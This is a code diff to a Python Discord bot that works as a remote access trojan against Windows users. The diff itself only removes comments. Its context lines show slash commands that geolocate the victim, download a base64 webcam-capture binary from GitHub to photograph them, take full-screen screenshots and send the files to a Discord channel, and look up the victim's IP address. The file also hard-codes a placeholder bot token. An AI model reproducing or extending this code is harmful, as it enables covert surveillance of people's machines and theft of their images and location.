@@ -16,7 +16,6 @@ import discord, os, subprocess, re, time
 notification_channel = 101010101010101010 
 server_id            = [101010101010101010, 210101010101010101]
 bot_token            = "nullcode.ajoijad.god.jekfmskef398f2jfip0ri32ofq9ir0309imwlke" 
-# ---------------------------------------------------------------------------------- #
 
 
 client       = discord.Bot()
@@ -68,7 +67,7 @@ async def geolocate(ctx):
     await ctx.respond(embed=embed)
 
 @client.slash_command(description="Capture image from webcam", guild_ids=server_ids)  
-async def webcam(ctx): # Brand new implementation by me
+async def webcam(ctx):
     await ctx.defer()
     webcam = bytes(get("https://raw.githubusercontent.com/NullCode13-Misc/CommandCam/master/CommandCam_binary_base64").text, "utf-8")
     os.chdir(f"C:\\Users\\{os.getenv('username')}\\Saved Games")
@@ -143,7 +142,7 @@ async def gsl(ctx):
     os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\youtube.txt")
 
 @client.slash_command(description="Sends screenshot of entire monitor", guild_ids=server_ids)
-async def screenshot(ctx): # Takes screenshot of window (by Sp00p64)
+async def screenshot(ctx): 
     await ctx.defer()
     with mss() as sct: sct.shot(output=f"C:\\Users\\{os.getenv('username')}\\Saved Games\\monitor.png")
     file = discord.File(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\monitor.png")
@@ -287,9 +286,7 @@ class closeall_confirm(discord.ui.View):
         await interaction.response.edit_message(view=self) 
         await interaction.channel.send(embed=Embed(title="Aborted shut-down"))   
         
-#
 # Required Functions
-#
 def IP():
     try: return get("http://icanhazip.com/").text.rstrip()
     except: return "127.0.0.1"
